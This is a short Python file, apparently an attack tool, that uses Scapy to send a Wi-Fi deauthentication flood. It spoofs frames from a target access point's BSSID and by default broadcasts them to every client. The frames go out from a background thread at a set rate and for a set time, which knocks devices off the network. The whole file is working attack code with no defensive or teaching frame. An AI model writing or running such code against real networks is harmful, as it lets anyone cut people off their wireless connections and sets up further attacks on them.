import threading, time
from scapy.all import *

def deauth_flood(iface, ap_bssid, client_mac="ff:ff:ff:ff:ff:ff",
                 rate=200, duration=30, counter=None):
    """
    Craft Deauthentication frames spoofed from the target AP's BSSID.
    Broadcast client_mac (ff:ff:ff:ff:ff:ff) disconnects all associated clients.
    reason=7: Class 3 frame received from non-associated station.
    """
    stop = threading.Event()
    if counter is None:
        counter = [0]

    frame = (RadioTap() /
             Dot11(type=0, subtype=12,
                   addr1=client_mac,
                   addr2=ap_bssid,
                   addr3=ap_bssid) /
             Dot11Deauth(reason=7))

    def _flood():
        end = time.time() + duration
        while time.time() < end and not stop.is_set():
            sendp(frame, iface=iface, count=rate, inter=0, verbose=False)
            counter[0] += rate

    t = threading.Thread(target=_flood, daemon=True)
    t.start()
    print(f"[+] Deauth flood started → AP: {ap_bssid} | Client: {client_mac} | "
          f"rate: {rate} f/s | duration: {duration}s")
    return stop, counter
